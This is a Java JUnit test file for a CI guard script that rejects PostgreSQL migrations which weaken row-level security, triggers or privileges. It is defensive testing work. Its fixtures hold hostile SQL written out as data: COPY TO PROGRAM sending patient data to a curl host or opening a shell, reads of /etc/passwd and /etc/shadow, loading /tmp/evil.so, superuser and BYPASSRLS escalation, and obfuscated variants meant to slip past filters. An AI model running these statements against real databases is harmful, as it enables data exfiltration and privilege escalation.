package saasagenda;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.HexFormat;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

/**
 * Guarda de migracao do CI (R-07, R-08; ADR-0027, ADR-0039, ADR-0040).
 * Roda scripts/ci/guarda-migracao.sh de verdade contra migracoes maliciosas e limpas.
 */
class GuardaMigracaoTest {

    private static final Path GUARDA = Path.of("scripts/ci/guarda-migracao.sh").toAbsolutePath();
    private static final Path APROVACOES = Path.of("src/main/resources/db/aprovacoes.sha256").toAbsolutePath();

    @TempDir
    Path tmp;

    record Resultado(int codigo, String saida) {
    }

    private Resultado guarda(Path dir, Path aprovacoes) throws Exception {
        Process p = new ProcessBuilder("bash", GUARDA.toString(), dir.toString(), aprovacoes.toString())
                .redirectErrorStream(true).start();
        String saida = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        assertThat(p.waitFor(60, TimeUnit.SECONDS)).isTrue();
        return new Resultado(p.exitValue(), saida);
    }

    private Path migracao(String nome, String sql) throws IOException {
        Path dir = Files.createDirectories(tmp.resolve("mig"));
        Files.writeString(dir.resolve(nome), sql, StandardCharsets.UTF_8);
        return dir;
    }

    private static String sha256(String conteudo) throws Exception {
        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256")
                .digest(conteudo.getBytes(StandardCharsets.UTF_8)));
    }

    private Path aprovacoes(String... linhas) throws IOException {
        Path f = tmp.resolve("aprovacoes.sha256");
        Files.writeString(f, String.join("\n", linhas) + "\n", StandardCharsets.UTF_8);
        return f;
    }

    private Path semAprovacoes() throws IOException {
        return aprovacoes("# vazio");
    }

    // ---------------------------------------------------------------- repositorio

    @Test
    void aceitaAsMigracoesEReversoesDoRepositorioComAsAprovacoes() throws Exception {
        for (String d : List.of("migration", "reversao")) {
            Resultado r = guarda(Path.of("src/main/resources/db", d).toAbsolutePath(), APROVACOES);
            assertThat(r.codigo()).as(r.saida()).isZero();
        }
    }

    @Test
    void migracoesDoRepositorioSemAprovacaoSaoRecusadas() throws Exception {
        // controle: as aprovacoes e que fazem o repositorio passar, nao uma guarda permissiva
        Resultado r = guarda(Path.of("src/main/resources/db/migration").toAbsolutePath(), semAprovacoes());
        assertThat(r.codigo()).as(r.saida()).isNotZero();
        assertThat(r.saida()).contains("CREATE POLICY", "CREATE TRIGGER", "ALTER POLICY",
                "CREATE FUNCTION", "GRANT", "SECURITY DEFINER", "SET ROLE saas_funcoes");
    }

    // ---------------------------------------------------------------- recusas

    static Stream<Arguments> maliciosas() {
        return Stream.of(
                // as nove construcoes de ADR-0027 e R-08
                Arguments.of("disable trigger", "ALTER TABLE saas.encaminhamento DISABLE TRIGGER ALL;"),
                Arguments.of("no force rls", "ALTER TABLE saas.encaminhamento NO FORCE ROW LEVEL SECURITY;"),
                Arguments.of("disable rls", "ALTER TABLE saas.encaminhamento DISABLE ROW LEVEL SECURITY;"),
                Arguments.of("drop policy", "DROP POLICY IF EXISTS encaminhamento_ver ON saas.encaminhamento;"),
                Arguments.of("drop trigger", "DROP TRIGGER encaminhamento_valida ON saas.encaminhamento;"),
                Arguments.of("session_replication_role", "SET session_replication_role = replica;"),
                Arguments.of("create policy", "CREATE POLICY tudo ON saas.encaminhamento USING (true);"),
                Arguments.of("alter policy", "ALTER POLICY encaminhamento_ver ON saas.encaminhamento USING (true);"),
                Arguments.of("create trigger",
                        "CREATE TRIGGER t BEFORE UPDATE ON saas.encaminhamento FOR EACH ROW EXECUTE FUNCTION saas.f();"),
                // grafias
                Arguments.of("minusculas e tabs", "alter\ttable saas.encaminhamento\n\tdisable\t\ttrigger all;"),
                Arguments.of("caixa mista", "AlTeR TaBlE saas.x DiSaBlE TrIgGeR USER;"),
                Arguments.of("comentario de bloco entre palavras", "ALTER TABLE saas.x DISABLE/* nada */TRIGGER ALL;"),
                Arguments.of("comentario aninhado", "ALTER TABLE saas.x NO /* a /* b */ c */ FORCE ROW LEVEL SECURITY;"),
                Arguments.of("comentario de linha entre palavras", "DROP -- nada aqui\n  POLICY p ON saas.x;"),
                Arguments.of("quebras de linha", "CREATE\r\nPOLICY\r\np\r\nON saas.x\r\nUSING (true);"),
                Arguments.of("aspas na tabela", "ALTER TABLE \"saas\".\"encaminhamento\" DISABLE TRIGGER ALL;"),
                Arguments.of("parametro entre aspas", "SET LOCAL \"session_replication_role\" TO 'replica';"),
                Arguments.of("parametro em caixa alta", "SET SESSION_REPLICATION_ROLE TO REPLICA;"),
                Arguments.of("set_config", "SELECT set_config('session_replication_role', 'replica', true);"),
                Arguments.of("set_config concatenado",
                        "SELECT pg_catalog.set_config('session_' || 'replication_role', 'replica', true);"),
                Arguments.of("alter role set", "ALTER ROLE saas_migracao SET session_replication_role = replica;"),
                Arguments.of("varios subcomandos",
                        "ALTER TABLE saas.x ENABLE ROW LEVEL SECURITY, NO FORCE ROW LEVEL SECURITY;"),
                Arguments.of("only e if exists", "ALTER TABLE IF EXISTS ONLY saas.x DISABLE TRIGGER encaminhamento_valida;"),
                Arguments.of("create or replace trigger",
                        "CREATE OR REPLACE TRIGGER t AFTER INSERT ON saas.x FOR EACH ROW EXECUTE FUNCTION saas.f();"),
                Arguments.of("constraint trigger",
                        "CREATE CONSTRAINT TRIGGER t AFTER INSERT ON saas.x FOR EACH ROW EXECUTE FUNCTION saas.f();"),
                Arguments.of("unicode no identificador", "SET U&\"session\\005freplication_role\" = replica;"),
                Arguments.of("dois literais adjacentes viram um",
                        "DO $$ BEGIN EXECUTE 'ALTER TABLE saas.x DISABLE TRIG'\n'GER ALL'; END $$;"),
                // dentro de DO, EXECUTE e corpo de funcao
                Arguments.of("DO com EXECUTE literal",
                        "DO $$ BEGIN EXECUTE 'ALTER TABLE saas.x DISABLE TRIGGER ALL'; END $$;"),
                Arguments.of("DO com tag e caixa baixa",
                        "do $corpo$ begin execute 'drop policy p on saas.x'; end $corpo$;"),
                Arguments.of("EXECUTE concatenado", "DO $$ BEGIN EXECUTE 'DROP ' || 'POLICY p ON saas.x'; END $$;"),
                Arguments.of("EXECUTE format", "DO $$ BEGIN EXECUTE format('%s TRIGGER ALL', 'ALTER TABLE saas.x DISABLE'); END $$;"),
                Arguments.of("EXECUTE com escape hexadecimal",
                        "DO $$ BEGIN EXECUTE E'ALTER TABLE saas.x DIS\\x41BLE TRIGGER ALL'; END $$;"),
                Arguments.of("EXECUTE com U& e UESCAPE",
                        "DO $$ BEGIN EXECUTE U&'ALTER TABLE saas.x !0044ISABLE TRIGGER ALL' UESCAPE '!'; END $$;"),
                Arguments.of("dollar dentro de dollar",
                        "CREATE FUNCTION saas.f() RETURNS void LANGUAGE plpgsql AS $f$ BEGIN EXECUTE $q$CREATE POLICY p ON saas.x USING (true)$q$; END $f$;"),
                Arguments.of("aspas dobradas dentro de literal",
                        "DO 'BEGIN EXECUTE ''ALTER POLICY p ON saas.x USING (true)''; END';"),
                Arguments.of("corpo de funcao sql",
                        "CREATE FUNCTION saas.g() RETURNS void LANGUAGE sql AS 'SET session_replication_role = replica';"),
                // equivalentes: regra, gatilho de evento, catalogo, CASCADE, funcao de gatilho, papel
                Arguments.of("create rule", "CREATE RULE r AS ON SELECT TO saas.x DO INSTEAD SELECT * FROM saas.y;"),
                Arguments.of("disable rule", "ALTER TABLE saas.x DISABLE RULE r;"),
                Arguments.of("enable replica trigger", "ALTER TABLE saas.x ENABLE REPLICA TRIGGER encaminhamento_valida;"),
                Arguments.of("alter trigger", "ALTER TRIGGER encaminhamento_valida ON saas.x RENAME TO t2;"),
                Arguments.of("event trigger", "ALTER EVENT TRIGGER saas_alerta_ddl DISABLE;"),
                Arguments.of("catalogo pg_trigger", "UPDATE pg_catalog.pg_trigger SET tgenabled = 'D';"),
                Arguments.of("catalogo pg_class", "UPDATE \"pg_class\" SET relforcerowsecurity = false WHERE relname = 'x';"),
                Arguments.of("drop function cascade", "DROP FUNCTION saas.encaminhamento_valida() CASCADE;"),
                Arguments.of("troca corpo da funcao de gatilho",
                        "CREATE OR REPLACE FUNCTION saas.encaminhamento_valida() RETURNS trigger LANGUAGE plpgsql AS $$ BEGIN RETURN NEW; END $$;"),
                Arguments.of("bypassrls", "ALTER ROLE saas_app BYPASSRLS;"),
                Arguments.of("dblink", "SELECT dblink_exec('dbname=x', 'ALTER TABLE saas.x ' || 'DISABLE TRIGGER ALL');"),
                Arguments.of("placeholder do flyway", "ALTER TABLE saas.x ${acao} TRIGGER ALL;"),
                Arguments.of("meta-comando do psql", "SELECT 'ALTER TABLE saas.x DISABLE ' || 'TRIGGER ALL' \\gexec"),
                Arguments.of("comentario sem fechamento", "/* ALTER TABLE saas.x\nCREATE TABLE saas.y (id int);"),
                Arguments.of("literal sem fechamento", "CREATE TABLE saas.y (id int); SELECT 'aberto;"));
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("maliciosas")
    void recusaMigracaoPerigosaSemAprovacao(String caso, String sql) throws Exception {
        Path dir = migracao("V9__x.sql", "SET ROLE saas_owner;\n" + sql + "\nRESET ROLE;\n");
        Resultado r = guarda(dir, semAprovacoes());
        assertThat(r.codigo()).as(caso + "\n" + r.saida()).isEqualTo(1);
        assertThat(r.saida()).contains("RECUSADA");
    }

    /**
     * Tentativa 2 (Revisor): tudo que muda quem acessa o que ou como a seguranca e avaliada
     * exige aprovacao. A guarda trabalha com lista de construcoes PERMITIDAS; estes casos cobrem
     * funcoes, privilegios, dono, papeis, SET ROLE/SESSION AUTHORIZATION, row_security e
     * set_config, COPY/arquivos/LOAD, extensoes, visoes, outros schemas e DDL comum disfarcada,
     * inclusive em caixa mista, com comentarios, dollar quoting com tag e EXECUTE format().
     */
    static Stream<Arguments> acessoESeguranca() {
        return Stream.of(
                Arguments.of("create or replace function de politica",
                        "CREATE OR REPLACE FUNCTION saas.ator_clinica() RETURNS uuid LANGUAGE sql AS $$ SELECT NULL::uuid $$;"),
                Arguments.of("create function sql minuscula",
                        "create function saas.pode_ver(uuid) returns boolean language sql stable as 'select true';"),
                Arguments.of("alter function security definer",
                        "ALTER FUNCTION saas.rede_ligada(uuid) SECURITY DEFINER;"),
                Arguments.of("alter function security invoker",
                        "ALTER FUNCTION saas.paciente_por_token(text) SECURITY INVOKER;"),
                Arguments.of("alter function search_path",
                        "ALTER FUNCTION saas.rede_ligada(uuid) SET search_path = public, pg_temp;"),
                Arguments.of("alter function reset search_path",
                        "ALTER FUNCTION saas.rede_ligada(uuid) RESET search_path;"),
                Arguments.of("alter function owner",
                        "ALTER FUNCTION saas.rede_ligada(uuid) OWNER TO saas_app;"),
                Arguments.of("alter routine rename",
                        "ALTER ROUTINE saas.ator_tipo() RENAME TO ator_tipo_velho;"),
                Arguments.of("alter procedure",
                        "ALTER PROCEDURE saas.p() SECURITY DEFINER;"),
                Arguments.of("create procedure",
                        "CREATE PROCEDURE saas.p() LANGUAGE sql AS $$ UPDATE saas.paciente SET nome = 'x' $$;"),
                Arguments.of("function com comentario entre palavras",
                        "CREATE /* x */ OR -- y\n REPLACE FUNCTION saas.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;"),
                Arguments.of("function begin atomic",
                        "CREATE FUNCTION saas.f() RETURNS boolean LANGUAGE sql BEGIN ATOMIC SELECT true; END;"),
                Arguments.of("function em DO com tag",
                        "DO $outro$ BEGIN EXECUTE $q$CREATE OR REPLACE FUNCTION saas.ator_tipo() RETURNS text LANGUAGE sql AS 'SELECT ''EQUIPE'''$q$; END $outro$;"),
                Arguments.of("function por EXECUTE format",
                        "DO $$ BEGIN EXECUTE format('ALTER FUNCTION %I.%I() SECURITY DEFINER', 'saas', 'f'); END $$;"),
                Arguments.of("function em caixa mista",
                        "AlTeR FuNcTiOn saas.f() SeCuRiTy DeFiNeR;"),
                Arguments.of("drop function sem cascade",
                        "DROP FUNCTION saas.ator_tipo();"),
                Arguments.of("grant to public",
                        "GRANT SELECT ON saas.paciente TO PUBLIC;"),
                Arguments.of("grant execute to public minusculo",
                        "grant execute on function saas.rede_ligada(uuid) to public;"),
                Arguments.of("grant all em tabela",
                        "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA saas TO saas_web;"),
                Arguments.of("grant de papel",
                        "GRANT saas_owner TO saas_web;"),
                Arguments.of("grant com public entre aspas",
                        "GRANT USAGE ON SCHEMA saas TO \"public\";"),
                Arguments.of("alter default privileges",
                        "ALTER DEFAULT PRIVILEGES IN SCHEMA saas GRANT SELECT ON TABLES TO saas_web;"),
                Arguments.of("alter default privileges com comentario",
                        "ALTER /**/ DEFAULT\n/* a */ PRIVILEGES FOR ROLE saas_owner REVOKE ALL ON FUNCTIONS FROM PUBLIC;"),
                Arguments.of("grant dentro de DO",
                        "DO $$ BEGIN GRANT SELECT ON saas.paciente TO saas_web; END $$;"),
                Arguments.of("grant por EXECUTE concatenado",
                        "DO $x$ BEGIN EXECUTE 'GR' || 'ANT SELECT ON saas.paciente TO saas_web'; END $x$;"),
                Arguments.of("alter table owner",
                        "ALTER TABLE saas.paciente OWNER TO saas_app;"),
                Arguments.of("alter schema owner",
                        "ALTER SCHEMA saas OWNER TO saas_web;"),
                Arguments.of("alter sequence owner",
                        "ALTER SEQUENCE saas.seq OWNER TO saas_web;"),
                Arguments.of("alter view owner",
                        "ALTER VIEW saas.v OWNER TO saas_web;"),
                Arguments.of("reassign owned",
                        "REASSIGN OWNED BY saas_owner TO saas_web;"),
                Arguments.of("owner em caixa e quebra",
                        "alter table saas.x\n  owner\n  to\n  saas_web;"),
                Arguments.of("create role",
                        "CREATE ROLE intruso LOGIN PASSWORD 'x';"),
                Arguments.of("create user",
                        "CREATE USER intruso;"),
                Arguments.of("alter role createrole",
                        "ALTER ROLE saas_web CREATEROLE;"),
                Arguments.of("alter role login",
                        "ALTER ROLE saas_owner LOGIN;"),
                Arguments.of("alter role set search_path",
                        "ALTER ROLE saas_web SET search_path = public;"),
                Arguments.of("alter role rename",
                        "ALTER ROLE saas_web RENAME TO saas_web2;"),
                Arguments.of("alter user superuser",
                        "ALTER USER saas_web WITH SUPERUSER;"),
                Arguments.of("alter group add",
                        "ALTER GROUP saas_owner ADD USER saas_web;"),
                Arguments.of("drop role",
                        "DROP ROLE saas_web;"),
                Arguments.of("create role em DO",
                        "DO $$ BEGIN EXECUTE 'CREATE ROLE x'; END $$;"),
                Arguments.of("set role outro",
                        "SET ROLE saas_funcoes;"),
                Arguments.of("set local role postgres",
                        "SET LOCAL ROLE postgres;"),
                Arguments.of("set session role",
                        "SET SESSION ROLE saas_web;"),
                Arguments.of("set role none",
                        "SET ROLE NONE;"),
                Arguments.of("set role entre aspas",
                        "SET ROLE 'saas_web';"),
                Arguments.of("set session authorization",
                        "SET SESSION AUTHORIZATION saas_web;"),
                Arguments.of("reset session authorization",
                        "RESET SESSION AUTHORIZATION;"),
                Arguments.of("set_config role",
                        "SELECT set_config('role', 'saas_web', false);"),
                Arguments.of("set role por EXECUTE format",
                        "DO $$ BEGIN EXECUTE format('SET ROLE %I', 'postgres'); END $$;"),
                Arguments.of("set row_security off",
                        "SET row_security = off;"),
                Arguments.of("set local row_security",
                        "set local ROW_SECURITY to OFF;"),
                Arguments.of("set_config row_security",
                        "SELECT set_config('row_security', 'off', true);"),
                Arguments.of("set_config app clinica",
                        "SELECT set_config('app.clinica_id', '00000000-0000-0000-0000-000000000000', false);"),
                Arguments.of("set saas.transicao",
                        "SET saas.transicao = 'on';"),
                Arguments.of("set app.papel aspas",
                        "SET \"app\".\"papel\" TO 'EQUIPE';"),
                Arguments.of("set_config search_path",
                        "SELECT pg_catalog.set_config('search_path', 'public', false);"),
                Arguments.of("set search_path fora",
                        "SET search_path = pg_temp, saas;"),
                Arguments.of("set search_path public primeiro so",
                        "SET search_path TO intruso, saas;"),
                Arguments.of("alter database set",
                        "ALTER DATABASE saas SET row_security = off;"),
                Arguments.of("set_config em DO com E",
                        "DO $$ BEGIN PERFORM set_config(E'row\\x5fsecurity', 'off', true); END $$;"),
                Arguments.of("set row_security via U&",
                        "SET U&\"row\\005fsecurity\" = off;"),
                Arguments.of("copy program",
                        "COPY saas.paciente TO PROGRAM 'curl -d @- http://x';"),
                Arguments.of("copy to arquivo",
                        "COPY saas.paciente TO '/tmp/pacientes.csv';"),
                Arguments.of("copy from arquivo",
                        "COPY saas.especialidade FROM '/etc/passwd';"),
                Arguments.of("copy select",
                        "copy (select * from saas.usuario) to stdout;"),
                Arguments.of("copy em DO",
                        "DO $$ BEGIN EXECUTE 'COPY saas.paciente TO PROGRAM ''sh''' ; END $$;"),
                Arguments.of("pg_read_file",
                        "INSERT INTO saas.especialidade (nome) VALUES (pg_read_file('/etc/passwd'));"),
                Arguments.of("lo_import",
                        "SELECT lo_import('/etc/shadow');"),
                Arguments.of("load",
                        "LOAD '/tmp/evil.so';"),
                Arguments.of("load minusculo com comentario",
                        "load /* lib */ 'auto_explain';"),
                Arguments.of("create extension",
                        "CREATE EXTENSION IF NOT EXISTS dblink;"),
                Arguments.of("create extension em schema",
                        "create extension pgcrypto schema saas;"),
                Arguments.of("alter extension",
                        "ALTER EXTENSION pgcrypto UPDATE;"),
                Arguments.of("drop extension",
                        "DROP EXTENSION pgcrypto;"),
                Arguments.of("create view",
                        "CREATE VIEW saas.paciente_todos AS SELECT * FROM saas.paciente;"),
                Arguments.of("create or replace view invoker",
                        "CREATE OR REPLACE VIEW saas.v WITH (security_invoker = false) AS SELECT 1;"),
                Arguments.of("alter view security_barrier",
                        "ALTER VIEW saas.v SET (security_barrier = false);"),
                Arguments.of("alter view reset invoker",
                        "ALTER VIEW saas.v RESET (security_invoker);"),
                Arguments.of("alter table set em visao",
                        "ALTER TABLE saas.v SET (security_invoker = off);"),
                Arguments.of("materialized view",
                        "CREATE MATERIALIZED VIEW saas.mv AS SELECT * FROM saas.paciente;"),
                Arguments.of("view recursiva temp",
                        "CREATE TEMP RECURSIVE VIEW v (n) AS VALUES (1);"),
                Arguments.of("create table em public",
                        "CREATE TABLE public.paciente (id uuid);"),
                Arguments.of("create table pg_temp",
                        "CREATE TABLE pg_temp.paciente (id uuid);"),
                Arguments.of("create function em public",
                        "CREATE FUNCTION public.now() RETURNS timestamptz LANGUAGE sql AS 'SELECT now()';"),
                Arguments.of("create operator em public",
                        "CREATE OPERATOR public.= (LEFTARG = uuid, RIGHTARG = uuid, FUNCTION = public.f);"),
                Arguments.of("create schema",
                        "CREATE SCHEMA intruso;"),
                Arguments.of("alter schema rename",
                        "ALTER SCHEMA saas RENAME TO saas_velho;"),
                Arguments.of("create index em public",
                        "CREATE INDEX i ON public.t (a);"),
                Arguments.of("alter table set schema",
                        "ALTER TABLE saas.paciente SET SCHEMA public;"),
                Arguments.of("create cast",
                        "CREATE CAST (text AS uuid) WITH FUNCTION public.f(text) AS IMPLICIT;"),
                Arguments.of("create table tres partes",
                        "CREATE TABLE db.saas.x (id int);"),
                Arguments.of("create table qualificado entre aspas",
                        "CREATE TABLE \"public\".\"x\" (id int);"),
                Arguments.of("alter table drop constraint",
                        "ALTER TABLE saas.paciente DROP CONSTRAINT paciente_clinica_fk;"),
                Arguments.of("alter table drop not null",
                        "ALTER TABLE saas.agendamento ALTER COLUMN clinica_id DROP NOT NULL;"),
                Arguments.of("alter table enable always trigger",
                        "ALTER TABLE saas.x ENABLE ALWAYS TRIGGER t;"),
                Arguments.of("alter table add + owner",
                        "ALTER TABLE saas.x ADD COLUMN y int, OWNER TO saas_web;"),
                Arguments.of("create table as select",
                        "CREATE TABLE saas.copia AS SELECT * FROM saas.paciente;"),
                Arguments.of("create table inherits",
                        "CREATE TABLE saas.filha (x int) INHERITS (saas.paciente);"),
                Arguments.of("create table partition of",
                        "CREATE TABLE saas.p1 PARTITION OF saas.paciente DEFAULT;"),
                Arguments.of("default chamando funcao saas",
                        "CREATE TABLE saas.y (id uuid DEFAULT saas.concede());"),
                Arguments.of("check chamando funcao desconhecida",
                        "CREATE TABLE saas.y (id int CHECK (concede_acesso(id)));"),
                Arguments.of("insert em usuario_clinica",
                        "INSERT INTO saas.usuario_clinica (usuario_id, clinica_id) VALUES ('a', 'b');"),
                Arguments.of("insert referencia com select",
                        "INSERT INTO saas.especialidade (nome) SELECT nome FROM saas.usuario;"),
                Arguments.of("insert on conflict do update",
                        "INSERT INTO saas.especialidade (nome) VALUES ('x') ON CONFLICT (nome) DO UPDATE SET nome = 'y';"),
                Arguments.of("update",
                        "UPDATE saas.usuario SET papel = 'ADMIN';"),
                Arguments.of("delete",
                        "DELETE FROM saas.evento_auditoria;"),
                Arguments.of("truncate",
                        "TRUNCATE saas.evento_auditoria;"),
                Arguments.of("drop table",
                        "DROP TABLE saas.evento_auditoria;"),
                Arguments.of("security label",
                        "SECURITY LABEL ON TABLE saas.x IS 'x';"),
                Arguments.of("import foreign schema",
                        "IMPORT FOREIGN SCHEMA public FROM SERVER s INTO saas;"),
                Arguments.of("begin commit",
                        "COMMIT; BEGIN;"),
                Arguments.of("call",
                        "CALL saas.p();"),
                Arguments.of("select chamando funcao",
                        "SELECT saas.concede_acesso('x');"),
                Arguments.of("prepare execute",
                        "PREPARE p AS SELECT 1; EXECUTE p;"),
                Arguments.of("comment com subconsulta",
                        "COMMENT ON TABLE saas.x IS (SELECT 'a');"),
                Arguments.of("create table with security_invoker",
                        "CREATE TABLE saas.y (id int) WITH (security_invoker = true);"),
                Arguments.of("rls em literal de DO",
                        "DO $a$ BEGIN EXECUTE $b$SET row_security = off$b$; END $a$;"),
                Arguments.of("grant em funcao de linguagem sql",
                        "CREATE FUNCTION saas.g() RETURNS void LANGUAGE sql AS 'GRANT ALL ON saas.paciente TO PUBLIC';"),
                Arguments.of("rename de tabela para sombra",
                        "ALTER TABLE saas.paciente RENAME TO paciente_velho; CREATE TABLE saas.paciente (id uuid);"),
                Arguments.of("rename de coluna para sombra",
                        "ALTER TABLE saas.agendamento RENAME COLUMN clinica_id TO c_velha;"),
                Arguments.of("alter type using reescreve tenant",
                        "ALTER TABLE saas.agendamento ALTER COLUMN clinica_id TYPE uuid USING '00000000-0000-0000-0000-000000000001'::uuid;"),
                Arguments.of("comment em funcao",
                        "COMMENT ON FUNCTION saas.f() IS 'x';"),
                Arguments.of("drop index cascade",
                        "DROP INDEX saas.i CASCADE;"),
                Arguments.of("index com expressao qualificada",
                        "CREATE INDEX i ON saas.x (saas.f(a));"),
                Arguments.of("set_config app sem ponto aparente E",
                        "SELECT set_config(E'app\\056papel', 'EQUIPE', false);"),
                Arguments.of("grant truncate",
                        "GRANT TRUNCATE ON saas.paciente TO saas_app;"),
                Arguments.of("grant trigger",
                        "GRANT TRIGGER ON saas.paciente TO saas_app;"),
                Arguments.of("grant all a papel da aplicacao",
                        "GRANT ALL ON saas.paciente TO saas_app;"),
                Arguments.of("grant with grant option",
                        "GRANT SELECT ON saas.paciente TO saas_app WITH GRANT OPTION;"),
                Arguments.of("grant granted by",
                        "GRANT SELECT ON saas.paciente TO saas_app GRANTED BY saas_owner;"),
                Arguments.of("grant a papel fora da lista",
                        "GRANT SELECT ON saas.paciente TO saas_web;"),
                Arguments.of("grant a public com outro papel",
                        "GRANT SELECT ON saas.paciente TO saas_app, PUBLIC;"),
                Arguments.of("revoke from public",
                        "REVOKE ALL ON saas.paciente FROM PUBLIC;"),
                Arguments.of("grant sem schema",
                        "GRANT SELECT ON paciente TO saas_app;"),
                Arguments.of("grant em public.x",
                        "GRANT SELECT ON public.x TO saas_app;"),
                Arguments.of("grant all tables in schema",
                        "GRANT SELECT ON ALL TABLES IN SCHEMA saas TO saas_app;"),
                Arguments.of("grant em sequence",
                        "GRANT USAGE ON SEQUENCE saas.s TO saas_app;"),
                Arguments.of("grant execute em funcao para app",
                        "GRANT EXECUTE ON FUNCTION saas.f() TO saas_app;"),
                Arguments.of("grant papel a app",
                        "GRANT saas_owner TO saas_app;"),
                Arguments.of("revoke grant option for",
                        "REVOKE GRANT OPTION FOR SELECT ON saas.paciente FROM saas_app;"),
                Arguments.of("revoke cascade",
                        "REVOKE SELECT ON saas.paciente FROM saas_app CASCADE;"),
                Arguments.of("grant em schema",
                        "GRANT USAGE ON SCHEMA saas TO saas_app;"),
                Arguments.of("grant app dentro de DO",
                        "DO $$ BEGIN GRANT SELECT ON saas.paciente TO saas_app; END $$;"),
                Arguments.of("grant com papel entre aspas maiusculo",
                        "GRANT SELECT ON saas.paciente TO \"SAAS_APP\";"));
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("acessoESeguranca")
    void recusaMudancaDeAcessoOuDeSegurancaSemAprovacao(String caso, String sql) throws Exception {
        Path dir = migracao("V9__x.sql", "SET ROLE saas_owner;\n" + sql + "\nRESET ROLE;\n");
        Resultado r = guarda(dir, semAprovacoes());
        assertThat(r.codigo()).as(caso + "\n" + r.saida()).isEqualTo(1);
        assertThat(r.saida()).contains("RECUSADA");
    }

    static Stream<Arguments> antesLimpasAgoraComAprovacao() {
        // estavam na migracao "limpa" da tentativa 1: agora exigem aprovacao (GRANT so passa
        // para saas_app, saas_jobs e saas_auth; REVOKE ... FROM PUBLIC exige aprovacao)
        return Stream.of(
                Arguments.of("GRANT", "GRANT SELECT, INSERT ON saas.nota TO saas_web;"),
                Arguments.of("REVOKE", "REVOKE ALL ON saas.nota FROM PUBLIC;"),
                Arguments.of("CREATE FUNCTION", "CREATE FUNCTION saas.nota_conta() RETURNS bigint LANGUAGE sql STABLE SECURITY DEFINER\n"
                        + "  SET search_path = saas, pg_temp AS $$ SELECT count(*) FROM saas.nota $$;"),
                Arguments.of("DROP", "DROP TABLE IF EXISTS saas.rascunho;"));
    }

    @ParameterizedTest(name = "{0}")
    @MethodSource("antesLimpasAgoraComAprovacao")
    void construcoesForaDaListaExigemAprovacao(String esperado, String sql) throws Exception {
        Resultado r = guarda(migracao("V9__x.sql", LIMPA + sql + "\n"), semAprovacoes());
        assertThat(r.codigo()).as(r.saida()).isEqualTo(1);
        assertThat(r.saida()).contains(esperado);
    }

    @Test
    void callbackDoFlywayENaoSqlTambemSaoConferidos() throws Exception {
        Path dir = migracao("beforeMigrate.sql", "SET session_replication_role = replica;\n");
        assertThat(guarda(dir, semAprovacoes()).codigo()).isEqualTo(1);
        Files.delete(dir.resolve("beforeMigrate.sql"));
        Files.createDirectories(dir.resolve("sub"));
        Files.writeString(dir.resolve("sub/V9__x.sql.conf"), "executeInTransaction=false\n");
        assertThat(guarda(dir, semAprovacoes()).codigo()).isEqualTo(1);
    }

    // ---------------------------------------------------------------- limpas

    static final String LIMPA = """
            -- Migracao limpa: so construcoes da lista permitida (ADR-0040, item 2).
            -- (este comentario cita DISABLE TRIGGER, GRANT ALL e SECURITY DEFINER e nao conta)
            /* nem este: CREATE POLICY p ON saas.x USING (true) */
            SET ROLE saas_owner;
            SET LOCAL search_path = saas, public;
            SET lock_timeout = '5s';
            CREATE TABLE saas.nota (
              id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
              clinica_id uuid NOT NULL REFERENCES saas.clinica (id) ON DELETE CASCADE,
              texto varchar(200) NOT NULL CHECK (char_length(texto) > 0),
              valor numeric(10,2),
              status text NOT NULL DEFAULT 'ABERTA' CHECK (status IN ('ABERTA','FECHADA')),
              criado_em timestamptz NOT NULL DEFAULT now(),
              UNIQUE (clinica_id, texto)
            );
            CREATE TABLE IF NOT EXISTS nota2 (id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY) WITH (fillfactor = 90);
            ALTER TABLE saas.nota ENABLE ROW LEVEL SECURITY;
            ALTER TABLE saas.nota FORCE ROW LEVEL SECURITY;
            CREATE INDEX nota_clinica_idx ON saas.nota (clinica_id);
            CREATE UNIQUE INDEX CONCURRENTLY IF NOT EXISTS nota_l ON ONLY saas.nota USING btree (lower(texto)) WHERE criado_em IS NOT NULL;
            ALTER TABLE saas.paciente ADD COLUMN apelido text, ADD CONSTRAINT apelido_ck CHECK (length(apelido) < 50) NOT VALID;
            ALTER TABLE paciente ALTER COLUMN apelido SET NOT NULL, ALTER apelido TYPE varchar(50);
            ALTER TABLE paciente ALTER COLUMN apelido SET DEFAULT '', VALIDATE CONSTRAINT apelido_ck;
            ALTER INDEX saas.nota_l RENAME TO nota_lower;
            DROP INDEX IF EXISTS saas.nota_lower;
            CREATE TYPE saas.cor AS ENUM ('A', 'B');
            ALTER TYPE saas.cor ADD VALUE IF NOT EXISTS 'C' AFTER 'B';
            CREATE SEQUENCE saas.seq_x START 1;
            COMMENT ON TABLE saas.nota IS 'Notas da clinica';
            COMMENT ON COLUMN saas.nota.texto IS 'texto livre';
            GRANT SELECT, INSERT ON saas.nota TO saas_app;
            GRANT SELECT (id, texto), UPDATE (texto) ON TABLE saas.nota TO saas_jobs, saas_auth;
            REVOKE DELETE ON saas.nota FROM saas_app;
            INSERT INTO saas.especialidade (id, nome) VALUES (gen_random_uuid(), 'Cardiologia'), (gen_random_uuid(), 'Pediatria') ON CONFLICT (nome) DO NOTHING;
            RESET ROLE;
            """;

    @Test
    void aceitaMigracaoLimpa() throws Exception {
        Resultado r = guarda(migracao("V9__limpa.sql", LIMPA), semAprovacoes());
        assertThat(r.codigo()).as(r.saida()).isZero();
        assertThat(r.saida()).contains("LIMPA");
    }

    @Test
    void aceitaArquivoDeAprovacoesAusente() throws Exception {
        Resultado r = guarda(migracao("V9__limpa.sql", LIMPA), tmp.resolve("nao-existe"));
        assertThat(r.codigo()).as(r.saida()).isZero();
    }

    // ---------------------------------------------------------------- aprovacao

